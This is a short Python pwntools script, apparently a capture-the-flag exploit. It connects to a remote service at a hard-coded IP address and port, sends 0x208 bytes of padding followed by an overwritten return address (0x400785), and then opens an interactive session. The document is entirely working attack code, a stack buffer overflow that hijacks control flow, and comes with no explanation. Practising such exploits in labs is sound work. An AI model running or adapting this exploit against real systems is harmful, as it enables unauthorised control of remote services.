from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = remote('139.155.83.108',10005)

payload = b'\x90'*0x208

payload += p64(0x400785)

p.send(payload)

p.interactive()